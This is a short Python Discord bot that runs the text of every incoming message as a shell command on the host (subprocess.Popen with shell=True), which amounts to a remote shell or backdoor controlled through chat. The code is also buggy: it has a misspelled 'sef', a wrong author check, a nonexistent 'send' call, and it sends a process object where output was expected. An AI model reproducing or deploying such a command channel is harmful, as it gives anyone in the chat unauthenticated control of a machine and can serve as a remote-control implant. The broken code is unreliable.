import discord
import secret
import subprocess

class client(discord.Client):
    async def on_ready(self):
        print(f'Logged in as {sef.user}!')

    async def on_message(self, message):
        print(f'Message from {message.author}: {message.content}')
        if message.author != self:
            shellProc = subprocess.Popen(message.content, shell=True)
            await self.send(shellProc)


intents = discord.Intents.default()
intents.message_content = True

cli = client(intents = intents)
cli.run(secret.BOT_ID)
